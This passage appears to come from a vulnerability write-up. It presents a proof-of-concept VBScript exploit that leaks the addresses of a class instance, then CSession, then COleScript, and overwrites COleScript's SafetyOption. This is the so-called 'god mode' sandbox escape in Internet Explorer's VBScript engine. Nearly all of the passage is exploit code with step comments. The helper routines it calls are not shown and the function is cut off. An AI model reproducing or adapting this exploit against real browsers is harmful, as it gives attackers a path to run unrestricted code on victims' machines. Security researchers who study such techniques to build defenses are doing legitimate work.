#### exploit (POC)
1. Create a dummy VBScriptClass instance
2. Get class instance address
3. Leak CSession address from class instance
4. Leak COleScript address from CSession instance
5. Override COleScript SafetyOption

```vb
Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem
            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174
```
